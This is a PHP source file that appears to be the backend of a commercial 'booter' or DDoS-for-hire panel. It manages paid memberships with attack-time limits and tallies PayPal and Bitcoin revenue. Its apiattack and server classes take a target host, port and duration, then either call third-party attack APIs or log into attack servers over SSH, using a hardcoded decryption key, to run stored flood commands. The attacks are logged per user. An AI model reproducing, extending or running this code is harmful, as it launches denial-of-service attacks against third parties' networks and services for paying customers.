<?php
error_reporting(0);
include ('vendor/autoload.php');

use \Curl\Curl;
class user
{
	function IsAdmin($odb)
	{
		$SQL = $odb -> prepare("SELECT `rank` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$rank = $SQL -> fetchColumn(0);
		if ($rank == 1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function isStaff($odb)
	{
		$SQL = $odb -> prepare("SELECT `rank` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$rank = $SQL -> fetchColumn(0);
		if ($rank == 2)
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function LoggedIn()
	{
		@session_start();
		if (isset($_SESSION['username'], $_SESSION['ID'], $_SESSION['wsource']))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function IsActive($odb)
	{
		$SQL = $odb -> prepare("SELECT `isactive` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$isactive = $SQL -> fetchColumn(0);
		if ($isactive == '1')
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function hasMembership($odb)
	{
		$SQL = $odb -> prepare("SELECT `expire` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$expire = $SQL -> fetchColumn(0);
		if (time() < $expire)
		{
			return true;
		}
		else
		{
			$SQLupdate = $odb -> prepare("UPDATE `users` SET `package` = 0 WHERE `ID` = :id");
			$SQLupdate -> execute(array(':id' => $_SESSION['ID']));
			$SQLupdate = $odb -> prepare("UPDATE `users` SET `maxboot` = 0 WHERE `ID` = :id");
			$SQLupdate -> execute(array(':id' => $_SESSION['ID']));
			return false;
		}
	}
	function IsBanned($odb)
	{
		$SQL = $odb -> prepare("SELECT `status` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$result = $SQL -> fetchColumn(0);
		if ($result == '1')
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function IsLocked($odb)
	{
		$SQL = $odb -> prepare("SELECT `status` FROM `users` WHERE `ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		$result = $SQL -> fetchColumn(0);
		if ($result == '5')
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	function getEmail($odb, $username)
	{
		$SQL = $odb -> prepare("SELECT `email` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getPackage($odb, $username)
	{
		$SQL = $odb -> prepare("SELECT `package` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$pid = $SQL -> fetchColumn(0);
		$SQL2 = $odb -> prepare("SELECT `name` FROM `packages` WHERE `ID` = :id");
		$SQL2 -> execute(array(':id' => $pid));
		$result = $SQL2 -> fetchColumn(0);
		
		if ($result == '0'){
			$result = '<i>No Package Found</i>';
		}
		return $result;
	}
	function getMBT($odb, $username)
	{
		$SQL = $odb -> prepare("SELECT `maxboot` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$result = $SQL -> fetchColumn(0);
		return $result.' Seconds';
	}
	function getExpiration($odb, $username)
	{
		$SQL = $odb -> prepare("SELECT `expire` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$expire = $SQL -> fetchColumn(0);
		if ($expire == '0')
		{
			$result = '-';
		} else {
			if ($expire < time())
			{
				$result = 'Expired, click <a href="packages.php">here</a> to renew.';
			} else {
				$result = gmdate("F j, Y, g:i A", $expire);
			}
		}
		return $result;
	}
	function setMaxBoot($odb, $userid)
	{
		$SQL = $odb -> prepare("SELECT `expire` FROM `users` WHERE `ID` = :userid");
		$SQL -> execute(array(':userid' => $userid));
		$package = $SQL -> fetchColumn(0);
		if ($package != 0) {
			$SQLGetTime = $odb -> prepare("SELECT `packages`.`mbt` FROM `packages` LEFT JOIN `users` ON `users`.`package` = `packages`.`ID` WHERE `users`.`ID` = :id");
			$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
			$maxTime = $SQLGetTime -> fetchColumn(0);
			$SQLupdate = $odb -> prepare("UPDATE `users` SET `maxboot` = :maxboot WHERE `id` = :id");
			$SQLupdate -> execute(array(':maxboot' => $maxTime, ':id' => $userid));
			return true;
		}
		return true;
	}
	
    function progressBarPlan($odb, $username)
    {
        $SQL = $odb -> prepare("SELECT packages.unit, packages.length, users.expire, users.package FROM users LEFT JOIN packages ON users.package=packages.id WHERE users.username= :username");
		$SQL -> execute(array(':username' => $username));
		$row = $SQL->fetch();
		
        
        //return $row['package'];

     
        if ($row['package']!=0) {
            $lengthUnit=$row['length']." ".$row['unit'];

            $dateExpire=date('Y/m/d', $row['expire']);

            $dateStart=date('Y/m/d', strtotime($dateExpire." - ".$lengthUnit));

            $dateStart=mktime(0, 0, 0, date('m', strtotime($dateStart)), date('d', strtotime($dateStart)), date('Y', strtotime($dateStart)));
            $dateExpire=mktime(0, 0, 0, date('m', strtotime($dateExpire)), date('d', strtotime($dateExpire)), date('Y', strtotime($dateExpire)));
            $progress=mktime(0, 0, 0, date('m', strtotime(date('Y/m/d'))), date('d', strtotime(date('Y/m/d'))), date('Y', strtotime(date('Y/m/d'))));

            $difference=$dateExpire-$dateStart;
            $days=$difference/(60*60*24);

            $lapsed=$progress-$dateStart;
            $Advance=$lapsed/(60*60*24);

            $percentage= $Advance/$days*100;
            $percentage=number_format($percentage, 0);

            if ($percentage >= 100) {
                $percentage = 100;
            } elseif ($percentage <= 0) {
                $percentage = 0;
			}

			if ($percentage <= 25) {
                $label = 'bg-success';
            }elseif ($percentage <= 50) {
                $label = '';
            }elseif ($percentage <= 75) {
                $label = 'bg-warning';
            }elseif ($percentage >= 76) {
                $label = 'bg-danger';
            }
			


			$bar='<span>Expiration status: '.$percentage.'%</span>
			
			<div class="progress mg-b-10">
                       
                <div class="progress-bar '.$label.' wd-'.$percentage.'p" role="progressbar" aria-valuenow="'.$percentage.'" aria-valuemin="0" aria-valuemax="100">'.$percentage.'%</div>

            </div>';

        }
    
		return $bar;

	}
}
class apiattack
{
    public function prepareAttack($odb, $host, $port, $time, $method)
    {
        $SQL = $odb -> prepare("SELECT * FROM `apis` WHERE `methods` LIKE :method ORDER BY RAND () LIMIT 1");
        $SQL -> execute(array(':method' => '%'.$method.'%'));
        while ($show = $SQL -> fetch(PDO::FETCH_ASSOC))
        {
        $arrayFind = array('[host]', '[port]', '[time]', '[method]', '[power]', '[vip]', '[premium]');
        $arrayReplace = array($host, $port, $time, $method, 100, 0);
        $ApiLink = $show['apiurl'];
        $StopLink = $show['stopurl'];
        $ApiLink = str_replace($arrayFind, $arrayReplace, $ApiLink);
        $curl = new Curl();
        $curl->setOpts(
    [
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_HTTPHEADER => [
            "Accept: application/json, text/javascript, */*; q=0.01",
            "X-Requested-With: XMLHttpRequest",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
        ],
        CURLOPT_RETURNTRANSFER => true
    ]);
        $curl->get($ApiLink);  
           
        }
        $insertLog = $odb->prepare("insert into `attacklogs` VALUES(NULL, :owner, :ip, :port, :time, :method, :type, :sid, :apiurl, :stopurl, UNIX_TIMESTAMP())");
        $insertLog->execute(array(':owner' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':type' => 'api', ':sid' => '0', ':apiurl' => $ApiLink, ':stopurl' => $StopLink));
    }
    public function stopAttack($odb, $target, $targetport, $targettime, $stopurl)
    {
        $arrayFind = array('[host]', '[port]', '[time]', '[method]');
$arrayReplace = array($target, $targetport, $targettime,'STOP');

        $StopLink = $stopurl;
        $StopLink = str_replace($arrayFind, $arrayReplace, $StopLink);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_USERAGENT, "API");
            curl_setopt($ch, CURLOPT_URL, $StopLink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        return true;
    }
}
class server
{
	public function getServerList($odb)
	{
		$SQL = $odb -> prepare("SELECT * FROM `servers`");
		$SQL -> execute();
		$result = $SQL->fetchAll();	
		return $result;
	}
	public function prepareAttack($odb, $host, $port, $time, $method)
	{
		global $test_mode;
		//$lmethod = strtolower($method)
		$SQL = $odb -> prepare("SELECT * FROM `servers` WHERE `methods` LIKE :method AND NOT `response` = 'offline' ORDER BY `response` ASC LIMIT 1");
		$SQL -> execute(array(':method' => '%'.$method.'%'));
		$server = $SQL->fetch(PDO::FETCH_ASSOC);
		//$methodzz = $server['methods'];
		$sid = $server['id'];
		$GetCommand = $odb -> prepare("SELECT * FROM `commands` WHERE `sid` = :sid AND `method` = :method LIMIT 1");
		$GetCommand -> execute(array(':method' => $method, ':sid' => $sid));
		$getCmd = $GetCommand->fetch(PDO::FETCH_ASSOC);
		$command = $getCmd['command'];
		//$command = str_replace(":method", $method, $command);
		$command = str_replace(":time", $time, $command);
		$command = str_replace(":host", $host, $command);
		$command = str_replace(":port", $port, $command);
		$insertLog = $odb->prepare("insert into `attacklogs` VALUES(NULL, :owner, :ip, :port, :time, :method, :type, :sid, :apiurl, :stopurl, UNIX_TIMESTAMP())");
		$insertLog->execute(array(':owner' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':type' => 'server', ':sid' => $sid, ':apiurl' => 'none', ':stopurl' => 'none'));
		if($test_mode == 1){
			return true; // dont forget to update your encryption key
		}else{
			return $this->sendAttack($server['host'], $server['username'], decryptData($server['password'], 'b12rj0wdj0a9cjfqpwm0cmop6PwSd8yN'), $command); // dont forget to update your encryption key
			}
	}
	public function stopAttack($odb, $targetip, $serverid, $method)
	{
		$SQL = $odb -> prepare("SELECT * FROM `servers` WHERE `id` = :id LIMIT 1");
		$SQL -> execute(array(':id' => $serverid));
		$server = $SQL->fetch(PDO::FETCH_ASSOC);
		$GetCommand = $odb -> prepare("SELECT * FROM `commands` WHERE `sid` = :sid AND `method` = :method LIMIT 1");
		$GetCommand -> execute(array(':method' => $method, ':sid' => $serverid));
		$getCmd = $GetCommand->fetch(PDO::FETCH_ASSOC);
		$command = $getCmd['stopCmd'];
		if ($command == 'none')
		{
		return false;
		} 
		else 
		{
		$command = str_replace(":target", $targetip, $command);
		$this->sendAttack($server['host'], $server['username'], decryptData($server['password'], 'b12rj0wdj0a9cjfqpwm0cmop6PwSd8yN'), $command); // dont forget to update your encryption key
		return true;
		}
	}
	public function sendAttack($ip, $username, $password, $command)
    {
        $handler = new Net_SSH2($ip);
        if(!$handler->login($username, $password))
        {
            return false;
        }
        else
        {
           $handler->setTimeout(30);
           return $handler->exec($command);
        }
    }
	public function responseTime($ip)
    {
		$start = microtime(true);
		$fp = fsockopen($ip, 22, $error, $error_info, 60);
		
		if(!$fp)
		{
			return 'offline';
		}
		else
		{
			$load = microtime(true) - $start;
			$final = $load * 1000;
			return round($final);
		}
    }
	public function updateResponse($odb)
    {
        $servers = $this->getServerList($odb);
        
        foreach($servers as $server)
        {
            $response = $this -> responseTime($server['host']);
            $SQL = $odb -> prepare("UPDATE `servers` SET `response` = :response WHERE `host` = :ip");
            $SQL -> execute(array(':response' => $response, ':ip' => $server['host']));
        }
    }
}
class stats
{
	function totalUsers($odb)
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `users`");
		return $SQL->fetchColumn(0);
	}
	function totalBoots($odb)
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `attacklogs`");
		return $SQL->fetchColumn(0);
	}
	function runningBoots($odb)
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `attacklogs` WHERE `time` <> 0 AND `time` + `date` > UNIX_TIMESTAMP()");
		return $SQL->fetchColumn(0);
	}
	function totalBootsForUser($odb, $user)
	{
		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `attacklogs` WHERE `user` = :user");
		$SQL -> execute(array(":user" => $user));
		return $SQL->fetchColumn(0);
	}
    function totalBootsForUserMethod($odb, $user, $method)
    {
		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `attacklogs` WHERE `user` = :user AND `method` = :method");
		//$SQL -> execute(array(":user" => $user));
		$SQL -> execute(array(":user" => $user, ":method" => $method));
		$method_value = $SQL->fetchColumn(0);

		$total_methods_SQL = $odb -> prepare("SELECT COUNT(*) FROM `attacklogs` WHERE `method` = :method");
		$total_methods_SQL -> execute(array(":method" => $method));

		$total_mv = $total_methods_SQL->fetchColumn(0);

		if ($method_value > 0) 
		{
			return round($method_value / $total_mv, 1);
		}
		else
		{
			return 0;
		}
	}

	function totalBootsForAllMethod($odb, $method)
    {
		$total_methods_SQL = $odb -> prepare("SELECT COUNT(*) FROM `attacklogs` WHERE `method` = :method");
		$total_methods_SQL -> execute(array(":method" => $method));

		$total_mv = $total_methods_SQL->fetchColumn(0);
	
		return $total_mv;
		
	}

	function concurrents($odb, $user)
	{
		$SQL = $odb -> prepare("SELECT `plans`.`concurrents` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQL -> execute(array(':id' => $_SESSION['ID']));
		return $SQL->fetchColumn(0);
	}
	function pendingTickets($odb, $userid)
	{
		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `tickets` WHERE `senderid` = :user AND `status` = 2");
		$SQL -> execute(array(":user" => $userid));
		return $SQL->fetchColumn(0);
	}
	function newTickets($odb) // ticket count for admin panel
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `tickets` WHERE `status` = 1");
		return $SQL->fetchColumn(0);
	}
	function totalServers($odb)
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `servers`");
		return $SQL->fetchColumn(0);
	}
	function totalApis($odb)
	{
		$SQL = $odb -> query("SELECT COUNT(*) FROM `apis`");
		return $SQL->fetchColumn(0);
	}
	function earnedToday($odb)
	{
		$unixDate = strtotime("-1 Day");
		$SQL = $odb -> prepare("SELECT sum(price) FROM `giftlogs` WHERE `date` > :date");
		$SQL -> execute(array(':date' => $unixDate));
		$paypal = $SQL -> fetchColumn(0);
		$pp_sum = $paypal;
		$SQL2 = $odb -> prepare("SELECT sum(amountusd) FROM `btc_payments` WHERE `date` > :date");
		$SQL2 -> execute(array(':date' => $unixDate));
		$bitcoin = $SQL2 -> fetchColumn(0);
		$btc_sum = $bitcoin;
		return $pp_sum + $btc_sum;
	}
	function earnedThisWeek($odb)
	{
		$unixDate = strtotime("-1 Weeks");
		$SQL = $odb -> prepare("SELECT sum(price) FROM `giftlogs` WHERE `date` > :date");
		$SQL -> execute(array(':date' => $unixDate));
		$paypal = $SQL -> fetchColumn(0);
		$pp_sum = $paypal;
		$SQL2 = $odb -> prepare("SELECT sum(amountusd) FROM `btc_payments` WHERE `date` > :date");
		$SQL2 -> execute(array(':date' => $unixDate));
		$bitcoin = $SQL2 -> fetchColumn(0);
		$btc_sum = $bitcoin;
		return $pp_sum + $btc_sum;
	}
	function earnedThisMonth($odb)
	{
		$unixDate = strtotime("-1 Months");
		$SQL = $odb -> prepare("SELECT sum(price) FROM `giftlogs` WHERE `date` > :date");
		$SQL -> execute(array(':date' => $unixDate));
		$paypal = $SQL -> fetchColumn(0);
		$pp_sum = $paypal;
		$SQL2 = $odb -> prepare("SELECT sum(amountusd) FROM `btc_payments` WHERE `date` > :date");
		$SQL2 -> execute(array(':date' => $unixDate));
		$bitcoin = $SQL2 -> fetchColumn(0);
		$btc_sum = $bitcoin;
		return $pp_sum + $btc_sum;
	}
	function earnedOverall($odb)
	{
		$SQL = $odb -> prepare("SELECT sum(price) FROM `giftlogs`");
		$SQL -> execute();
		$paypal = $SQL -> fetchColumn(0);
		$pp_sum = $paypal;
		$SQL2 = $odb -> prepare("SELECT sum(amountusd) FROM `btc_payments`");
		$SQL2 -> execute();
		$bitcoin = $SQL2 -> fetchColumn(0);
		$btc_sum = $bitcoin;
		return $pp_sum + $btc_sum;
	}
}
class settings
{
	function getSiteTitle($odb)
	{
		$SQL = $odb -> prepare("SELECT `sitetitle` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSiteUrl($odb)
	{
		$SQL = $odb -> prepare("SELECT `siteurl` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSiteMail($odb)
	{
		$SQL = $odb -> prepare("SELECT `sitemail` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSiteContact($odb)
	{
		$SQL = $odb -> prepare("SELECT `contact` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getPPMail($odb)
	{
		$SQL = $odb -> prepare("SELECT `paypal` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getBTCAddress($odb)
	{
		$SQL = $odb -> prepare("SELECT `btc` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSkypeApi($odb)
	{
		$SQL = $odb -> prepare("SELECT `skypeapi` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getTrialSeconds($odb)
	{
		$SQL = $odb -> prepare("SELECT `trialseconds` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getCustomPackages($odb)
	{
		$SQL = $odb -> prepare("SELECT `custompackages` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getCustomPBase($odb)
	{
		$SQL = $odb -> prepare("SELECT `custompbase` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getMailingType($odb)
	{
		$SQL = $odb -> prepare("SELECT `mailingtype` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSMTPHost($odb)
	{
		$SQL = $odb -> prepare("SELECT `smtphost` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSMTPUser($odb)
	{
		$SQL = $odb -> prepare("SELECT `smtpuser` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSMTPPass($odb)
	{
		$SQL = $odb -> prepare("SELECT `smtppass` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getSMTPPort($odb)
	{
		$SQL = $odb -> prepare("SELECT `smtpport` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getMerchant($odb)
	{
		$SQL = $odb -> prepare("SELECT `cpmerchant` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
	function getIPNSecret($odb)
	{
		$SQL = $odb -> prepare("SELECT `cpipnsecret` FROM `settings` WHERE `id` = 1");
		$SQL -> execute();
		$result = $SQL -> fetchColumn(0);
		return $result;
	}
}
?>